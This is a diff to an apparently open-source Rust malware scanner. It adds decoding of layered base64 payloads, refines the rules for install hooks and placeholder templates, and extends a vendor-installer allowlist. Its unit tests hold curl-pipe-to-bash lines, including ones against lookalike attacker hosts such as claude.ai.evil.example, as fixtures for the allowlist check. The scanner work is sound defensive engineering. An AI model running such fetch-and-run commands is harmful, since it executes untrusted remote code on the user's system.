@@ -4,7 +4,10 @@ use std::path::Path;
 use walkdir::WalkDir;
 
 /// Human-readable ruleset version (also surfaced by `kalascan rules`).
-pub const RULESET_VERSION: &str = "2026.11.10";
+pub const RULESET_VERSION: &str = "2026.11.11";
+/// A hash of the rule files and detection modules this binary was built
+/// from (build.rs): what a result is tied to when the version is not enough.
+pub const DETECTION_FINGERPRINT: &str = env!("KALASCAN_DETECTION");
 
 /// Critical file extensions for scanning
 // `.yml`/`.yaml` get only the exfiltration, network, supply-chain and
@@ -263,8 +266,12 @@ fn rule_hits<'r>(
     let line_start = |idx: usize| if idx == 0 { 0 } else { newlines[idx - 1] + 1 };
     let lower = std::cell::OnceCell::new();
     let mut out = Vec::new();
+    // A module that is only called `setup.py` (`pkg/tunnels/setup.py`) runs
+    // when it is imported, not at `pip install`.
+    let setup_script = content.contains("setup(")
+        && (content.contains("setuptools") || content.contains("distutils"));
     for rule in rules {
-        if !rule.applies_to(ext, filename) {
+        if !rule.applies_to(ext, filename) || (rule.category == "install_hook" && !setup_script) {
             continue;
         }
         for (start, end) in rule_spans(rule, content, &lower) {
@@ -282,6 +289,11 @@ fn rule_hits<'r>(
                     && links_to_store_page(&content[line_start(line)..start]))
                 || (rule.name == SYSTEMD_USER
                     && printed_for_the_user(&content[line_start(line)..start]))
+                // `…|net group|net localgroup|net print|…`: a syntax
+                // highlighter's list of batch commands.
+                || (rule.name == ACCOUNT_ENUM
+                    && content[..start].ends_with('|')
+                    && content[end..].starts_with('|'))
             {
                 continue;
             }
@@ -1105,6 +1117,15 @@ fn scan_bytes(
             chains.push(flow);
         }
     }
+    // What an encoded literal decodes to is code of this file too.
+    for found in layer_findings(rel_path, filename, ext, &content, rules, None, 0) {
+        let seen = matches.iter().chain(&chains).any(|m| {
+            m.line_number == found.line_number && m.matched_pattern == found.matched_pattern
+        });
+        if !seen && !ignored_lines.contains(&(found.line_number - 1)) {
+            chains.push(found);
+        }
+    }
     // MCP server code: tool descriptions are prompts.
     out.extend(crate::agent::scan(rel_path, &content, &matches));
     // javascript-obfuscator hides every API name in a string table.
@@ -1116,6 +1137,73 @@ fn scan_bytes(
             rel_path,
             &crate::obfuscator::string_table(&content),
         ));
+    }
+    out
+}
+
+/// How deep encoded layers are followed: a payload wrapped twice happens,
+/// more is rare.
+const MAX_LAYER_DEPTH: u8 = 2;
+
+/// Rules, chains and data flow on what the base64 and hex literals of
+/// `content` decode to (`obfuscator::layers`), each reported on the line of
+/// its literal. `eval(Buffer.from('…','base64'))` alone is a lead; what it
+/// runs decides.
+fn layer_findings(
+    rel_path: &str,
+    filename: &str,
+    ext: &str,
+    content: &str,
+    rules: &[Rule],
+    outer_line: Option<usize>,
+    depth: u8,
+) -> Vec<RuleMatch> {
+    let no_markers = std::collections::HashSet::new();
+    let mut out = Vec::new();
+    for (at, decoded) in crate::obfuscator::layers(content) {
+        let line = outer_line.unwrap_or_else(|| content[..at].matches('\n').count() + 1);
+        let plain = crate::obfuscator::plain(&decoded);
+        let mut matches: Vec<RuleMatch> = Vec::new();
+        let mut offsets = Vec::new();
+        for text in [
+            Some(decoded.as_str()),
+            matches!(plain, std::borrow::Cow::Owned(_)).then_some(&*plain),
+        ]
+        .into_iter()
+        .flatten()
+        {
+            for (rule, _, start, context) in rule_hits(text, rules, ext, filename, &no_markers) {
+                offsets.push(floor_boundary(&decoded, start));
+                matches.push(RuleMatch {
+                    file_path: rel_path.to_string(),
+                    line_number: line,
+                    matched_pattern: rule.name.to_string(),
+                    severity: rule.severity.to_string(),
+                    context: format!("decoded: {context}"),
+                });
+            }
+        }
+        let mut chains = crate::correlate::correlate_file(rel_path, &decoded, &matches, &offsets);
+        chains.extend(crate::dataflow::flows(rel_path, &decoded));
+        // Every hit sits on the literal's line: one finding per rule is enough.
+        let mut seen = std::collections::HashSet::new();
+        for mut found in matches.into_iter().chain(chains) {
+            found.line_number = line;
+            if seen.insert(found.matched_pattern.clone()) {
+                out.push(found);
+            }
+        }
+        if depth < MAX_LAYER_DEPTH {
+            out.extend(layer_findings(
+                rel_path,
+                filename,
+                ext,
+                &decoded,
+                rules,
+                Some(line),
+                depth + 1,
+            ));
+        }
     }
     out
 }
@@ -1176,11 +1264,14 @@ pub(crate) fn keep_hit(rule: &str, text: &str) -> bool {
 }
 
 /// `f"exec(base64.b64decode('{encoded}'))"`: a command template for another
-/// process, with a format placeholder where a payload would be. `after` is
-/// the text that follows the matched `…b64decode(`.
+/// process, with a format placeholder where a payload would be, or the
+/// string closed and a variable joined on (`…b64decode('" + payload + "')`),
+/// or `…` in a description of the pattern. `after` is the text that follows
+/// the matched `…b64decode(`.
 fn decodes_a_placeholder(after: &str) -> bool {
-    static PLACEHOLDER: std::sync::LazyLock<Regex> =
-        std::sync::LazyLock::new(|| Regex::new(r#"^\s*['"]?\{[\w.!:\[\]]*\}['"]?\s*\)"#).unwrap());
+    static PLACEHOLDER: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+        Regex::new(r#"^\s*(?:\\?['"]?\{[\w.!:\[\]]*\}\\?['"]?\s*\)|\\?['"]\s*["']\s*(?:\+|f?["'])|\.\.\.|…)"#).unwrap()
+    });
     PLACEHOLDER.is_match(&after[..floor_boundary(after, 80)])
 }
 
@@ -1258,6 +1349,27 @@ fn is_vendor_download(url: &str) -> bool {
         "google",
         "wasmtime.dev",
         "openclaw.ai",
+        // Installers of agent CLIs and developer tools, each on the vendor's
+        // own domain: the most common download cradle in new npm and PyPI
+        // releases (eval/README.md, "What the registries publish today").
+        "claude.ai",
+        "cursor.com",
+        "opencode.ai",
+        "chatgpt.com",
+        "x.ai",
+        "kimi.com",
+        "factory.ai",
+        "qoder.com",
+        "devin.ai",
+        "kiro.dev",
+        "aider.chat",
+        "kilo.ai",
+        "ampcode.com",
+        "tailscale.com",
+        "nodesource.com",
+        "mise.run",
+        "temporal.download",
+        "mobile.dev",
     ];
     // Official installers on GitHub raw, pinned to orgs nobody else controls.
     const VENDOR_PATHS: &[&str] = &[
@@ -1271,7 +1383,12 @@ fn is_vendor_download(url: &str) -> bool {
         return false;
     };
     let rest = rest.to_ascii_lowercase();
-    let host = rest.split(['/', ':', '?']).next().unwrap_or_default();
+    // Up to the first character a host name cannot hold: `https://sh.rustup.rs | sh`
+    // has no path, and the space used to end up in the host.
+    let end = rest
+        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '.' || c == '-'))
+        .unwrap_or(rest.len());
+    let host = &rest[..end];
     VENDORS
         .iter()
         .any(|v| host == *v || host.ends_with(&format!(".{}", v)))
@@ -1638,6 +1755,16 @@ mod tests {
             "irm https://antigravity.google/cli/install.ps1 | iex"
         ));
         assert!(!is_vendor_download("https://evil.google.evil.ru/a.sh"));
+        // No path after the host, and an agent CLI's installer.
+        assert!(is_vendor_download(
+            "curl --proto '=https' -sSf https://sh.rustup.rs | sh"
+        ));
+        assert!(is_vendor_download(
+            "curl -fsSL https://claude.ai/install.sh | bash"
+        ));
+        assert!(!is_vendor_download(
+            "curl -fsSL https://claude.ai.evil.example/install.sh | bash"
+        ));
         assert!(is_vendor_download(
             "curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash"
         ));
@@ -1681,6 +1808,16 @@ mod tests {
         assert!(decodes_a_placeholder("{encoded!r}))"));
         assert!(!decodes_a_placeholder("'aW1wb3J0IG9z'))"));
         assert!(!decodes_a_placeholder("payload))"));
+        // Shapes from new releases: the string closed and a variable joined
+        // on, an escaped quote around the placeholder, a description.
+        assert!(decodes_a_placeholder(
+            "'\" + Buffer.from(INSTALLER).toString('base64') + \"'))"
+        ));
+        assert!(decodes_a_placeholder(
+            "'\" f\"{b64_driver}').decode('utf-8'))"
+        ));
+        assert!(decodes_a_placeholder("\\\"{encoded}\\\"))'"));
+        assert!(decodes_a_placeholder("...)) (explicit payload staging)"));
         // Random packages drawn for ruleset 2026.11.8: a wallet connector's
         // install link, an instruction printed for the user.
         assert!(links_to_store_page(
